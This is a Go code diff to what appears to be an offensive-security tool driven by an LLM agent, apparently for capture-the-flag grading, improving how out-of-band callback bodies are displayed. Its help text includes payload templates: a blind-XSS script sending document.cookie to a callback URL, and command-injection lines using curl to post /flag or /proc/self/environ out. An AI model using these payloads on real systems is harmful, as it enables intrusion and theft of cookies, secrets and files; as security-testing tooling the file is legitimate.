@@ -23,6 +23,39 @@ import (
 
 const oobBodyCap = 4096
 
+// oobBodyDisplayHead/Tail bound how much of an exfil body oob_check renders. An OOB callback body IS
+// the exfiltrated payload (a file, an env dump), so the cap must be generous enough that a flag landing
+// deep in the body still shows -- the old ~300B cap hid it. headTail keeps both ends.
+const (
+	oobBodyDisplayHead = 1536
+	oobBodyDisplayTail = 512
+)
+
+// printableOOB makes an exfiltrated callback body readable in the terminal + transcript. Blind-cmdi /
+// SSRF exfil channels routinely ship NUL-separated data (/proc/self/environ) or binary blobs; rendered
+// raw, the first NUL truncates the display so everything past it (the flag env var) is invisible to the
+// operator AND to the driving LLM -- which then wrongly concludes the exfil failed and wastes turns.
+// NUL becomes a newline (an env dump reads as KEY=val lines); other non-printable control bytes become
+// '.'. Printable ASCII (the literal flag) is untouched, so the grader still matches it (§10).
+func printableOOB(s string) string {
+	var b strings.Builder
+	b.Grow(len(s))
+	for i := 0; i < len(s); i++ {
+		c := s[i]
+		switch {
+		case c == 0:
+			b.WriteByte('\n')
+		case c == '\t' || c == '\n' || c == '\r':
+			b.WriteByte(c)
+		case c < 0x20 || c == 0x7f:
+			b.WriteByte('.')
+		default:
+			b.WriteByte(c)
+		}
+	}
+	return b.String()
+}
+
 // OOBHit is one recorded inbound callback -- the proof a blind vuln fired, and the channel a payload
 // exfils data through (query/body).
 type OOBHit struct {
@@ -160,8 +193,9 @@ func tOOBURL(cc *Context, _ map[string]any) string {
 			"  - SSRF: point the vulnerable fetch/url param at %s\n"+
 			"  - blind XSS / exfil: <script>fetch('%s?c='+encodeURIComponent(document.cookie))</script>\n"+
 			"  - blind cmd-injection: ;curl %s  (or a wget/nslookup of the host)\n"+
+			"  - exfil a file/env through the body: ;curl %s -d @/flag   or   -d @/proc/self/environ  (the body is rendered readably even when NUL-separated, so a flag env var past the first NUL still shows)\n"+
 			"A recorded hit PROVES the target reached back (the blind signal); its query/body carries anything you exfil (a cookie, a flag).",
-		url, token, token, url, url, url)
+		url, token, token, url, url, url, url)
 }
 
 // tOOBCheck reports callbacks recorded so far (optionally filtered by token).
@@ -191,10 +225,7 @@ func tOOBCheck(cc *Context, args map[string]any) string {
 		}
 		b.WriteString(line + "\n")
 		if h.Body != "" {
-			bd := h.Body
-			if len(bd) > 300 {
-				bd = bd[:300] + "…"
-			}
+			bd := printableOOB(headTail(h.Body, oobBodyDisplayHead, oobBodyDisplayTail))
 			b.WriteString("      body: " + bd + "\n")
 		}
 	}
